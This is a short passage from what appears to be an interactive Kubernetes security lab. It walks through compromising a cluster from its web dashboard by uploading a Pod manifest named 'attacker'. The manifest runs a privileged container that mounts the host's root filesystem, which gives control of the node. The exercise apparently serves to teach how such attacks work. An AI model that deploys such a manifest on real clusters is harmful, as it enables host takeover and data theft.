## Inside dashboard

Now as shown in the video lets compormise the cluster from the dashboard

1. Now lets add our malicious file into the cluster, press ADD sign button in the navbar
2. In the create from input copy-paste this code
```
apiVersion: v1
kind: Pod
metadata:
  name: attacker
  labels:
    app: attacker
spec:
  containers:
    - name: attacker
      image: hackingkubernetes/api:latest
      imagePullPolicy: IfNotPresent
      volumeMounts:
        - name: hostsvolume
          mountPath: /attacker
      ports:
        - containerPort: 80
      securityContext:
        privileged: true
  volumes:
    - name: hostsvolume
      hostPath:
        path: /
```{{copy}}
3. Press Upload

## Configure our webapp

After the above code executed run this command to run our webapp and API server
`bash pods.sh`{{execute HOST1}}

Check if pods are created
`kubectl get pods`{{execute HOST1}}